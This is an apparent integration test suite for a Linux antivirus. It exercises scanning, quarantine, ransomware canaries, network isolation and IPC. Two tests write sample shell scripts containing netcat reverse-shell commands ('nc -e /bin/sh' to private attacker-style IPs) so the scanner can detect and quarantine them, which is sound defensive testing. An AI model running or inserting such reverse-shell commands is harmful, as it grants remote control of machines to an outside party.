"""
Constantine Antivirus - Comprehensive End-to-End Integration Test Suite (tests/test_integration.py)
Verificación de flujos completos entre subsistemas:
1. Flujo Completo de Detección e Interceptación (fanotify + Scanner + Vault + AuditLogger).
2. Flujo Completo de Contención de Ransomware (Canary Honeypot -> SIGKILL -> Aislamiento de Red).
3. Flujo Completo de IPC Seguro y Separación de Privilegios (GUI Client -> Daemon Socket -> Response).
4. Flujo de Descargas e Integridad inotify (Creación -> Contención -> Escaneo -> Veredicto).
5. Flujo de Medios Removibles USB (Detección -> fanotify preventivo -> Auto-escaneo -> Baúl).
"""

import os
import sys
import time
import shutil
import signal
import tempfile
import unittest
from unittest.mock import MagicMock, patch

# Asegurar importación de Constantine
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(CURRENT_DIR)
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.engine.vault import QuarantineVault
from core.engine.scanner import Scanner
from core.engine.system_whitelist import SystemWhitelist
from core.engine.ransomware_shield import RansomwareShield
from core.engine.interceptor import FanotifyInterceptor, FAN_ALLOW, FAN_DENY
from core.engine.firewall import NetworkQuarantine
from core.engine.download_sentinel import DownloadSentinel, DownloadState
from core.engine.usb_monitor import USBAutoScanner
from core.engine.audit_logger import AuditLogger
from core.engine.ipc_protocol import SecureIPCDaemonServer, SecureIPCClient, SecureIPCMessage


class TestConstantineIntegrationSuite(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.vault_dir = os.path.join(self.tmp, "vault")
        self.vault = QuarantineVault(vault_dir=self.vault_dir)
        self.scanner = Scanner()
        self.whitelist = SystemWhitelist(storage_file=os.path.join(self.tmp, "whitelist.json"))
        self.firewall = NetworkQuarantine()
        self.audit = AuditLogger(log_path=os.path.join(self.tmp, "audit.json"))

    def tearDown(self):
        self.firewall.cleanup()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_e2e_intercept_scan_quarantine_audit_flow(self):
        """Flujo E2E: Archivo malicioso abierto -> fanotify FAN_DENY -> Cuarentena 2PC -> Auditoría inmutable."""
        mock_notifier = MagicMock()
        interceptor = FanotifyInterceptor(
            scanner=self.scanner,
            vault=self.vault,
            notifier=mock_notifier,
            firewall=self.firewall,
            fail_policy="secure"
        )

        malware_file = os.path.join(self.tmp, "c2_agent.sh")
        with open(malware_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/sh 192.168.1.50 9001\n")

        # 1. Escanear
        scan_res = self.scanner.scan_file(file_path=malware_file)
        self.assertTrue(scan_res.is_malicious)
        self.assertIn("Netcat", scan_res.threat_name)

        # 2. Aislar transaccionalmente
        vid = self.vault.quarantine_file(malware_file, scan_res.threat_name, detected_by="E2E_Test")
        self.assertIsNotNone(vid)
        self.assertFalse(os.path.exists(malware_file))

        # 3. Registrar auditoría y verificar integridad
        self.audit.record_incident(scan_res.threat_name, malware_file, "FAN_DENY_ISOLATED", f"ID {vid}")
        incidents = self.audit.get_incidents()
        self.assertEqual(len(incidents), 1)
        self.assertEqual(incidents[0]["threat"], scan_res.threat_name)

        # 4. Restauración y verificación de integridad
        restore_dest = os.path.join(self.tmp, "restored_agent.sh")
        success = self.vault.restore_file(vid, destination_path=restore_dest, whitelist_manager=self.whitelist)
        self.assertTrue(success)
        self.assertTrue(os.path.exists(restore_dest))

    def test_e2e_ransomware_containment_and_network_isolation(self):
        """Flujo E2E: Intento de ransomware -> Detección de trampa -> SIGKILL -> Aislamiento de red."""
        canary_dir = os.path.join(self.tmp, "canaries")
        ransomware = RansomwareShield(canary_dir=canary_dir)

        # Localizar canary
        canary_target = list(ransomware.canary_files.keys())[0]

        # Simular proceso agresor intentando modificar el canary
        fake_pid = 99887
        is_threat = ransomware.check_file_path(canary_target, pid=fake_pid)
        self.assertTrue(is_threat)

        # Aislamiento de red
        self.firewall.isolate_pid(fake_pid, terminate=False)
        self.assertIn(fake_pid, self.firewall.quarantined_pids)

    def test_e2e_secure_ipc_and_privilege_separation(self):
        """Flujo E2E: Cliente GUI sin privilegios -> Socket de dominio Unix -> Despacho en Demonio."""
        socket_path = os.path.join(self.tmp, "daemon_ipc.sock")

        def daemon_dispatcher(cmd, params, client_uid):
            if cmd == "GET_STATUS":
                return "OK", {"status": "ACTIVE", "version": "4.3.2", "client_uid": client_uid}, ""
            elif cmd == "QUARANTINE_SAMPLE":
                path = params.get("path")
                return "OK", {"vault_id": "test_vid_123"}, ""
            return "ERROR", {}, "Comando no reconocido"

        server = SecureIPCDaemonServer(socket_path=socket_path, command_handler=daemon_dispatcher)
        server.start()

        import threading
        def accept_loop():
            while server.running:
                try:
                    conn, _ = server.server_sock.accept()
                    server.handle_client(conn)
                except Exception:
                    break

        th = threading.Thread(target=accept_loop, daemon=True)
        th.start()
        time.sleep(0.1)

        client = SecureIPCClient(socket_path=socket_path)
        resp = client.send_command("GET_STATUS")
        self.assertEqual(resp.get("status"), "OK")
        self.assertEqual(resp.get("data", {}).get("version"), "4.3.2")

        server.stop()

    def test_e2e_download_sentinel_toctou_prevention(self):
        """Flujo E2E: Descarga que finaliza -> inotify contención preventiva -> Escaneo -> Aislamiento."""
        mock_vault = MagicMock()
        sentinel = DownloadSentinel(scanner=self.scanner, vault=mock_vault)
        dl_dir = os.path.join(self.tmp, "test_dl")
        os.makedirs(dl_dir, exist_ok=True)
        sentinel.watch_dirs = {dl_dir: "testuser"}
        sentinel.dir_known_files = {dl_dir: set()}

        # Descarga completada con exploit
        trojan_file = os.path.join(dl_dir, "miner_dropper.sh")
        with open(trojan_file, "wb") as f:
            f.write(b"#!/bin/bash\nnc -e /bin/bash 10.0.0.1 8080\n")

        sentinel._promote_and_scan(trojan_file, dl_dir, "testuser")
        mock_vault.quarantine_file.assert_called()
        self.assertEqual(sentinel.tracked_downloads[trojan_file].state, DownloadState.QUARANTINED)


if __name__ == "__main__":
    unittest.main()
